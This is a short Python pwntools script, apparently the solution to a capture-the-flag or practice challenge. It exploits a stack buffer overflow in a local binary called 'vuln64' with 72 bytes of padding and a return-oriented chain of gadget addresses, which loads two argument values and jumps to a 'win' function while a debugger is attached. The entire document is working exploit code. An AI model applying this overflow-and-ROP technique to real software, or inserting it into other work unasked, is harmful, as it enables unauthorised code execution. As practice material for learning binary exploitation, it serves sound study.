from pwn import *

io = process('./vuln64')
gdb.attach(io, api=True)
payload = b'a'*72
payload += p64(0x401253) + p64(0x1337C0DE) # args1
payload += p64(0x401251) + p64(0xD34DB33F) + p64(0) # args2
payload += p64(0x401156) # address win
io.sendline(payload)
io.interactive()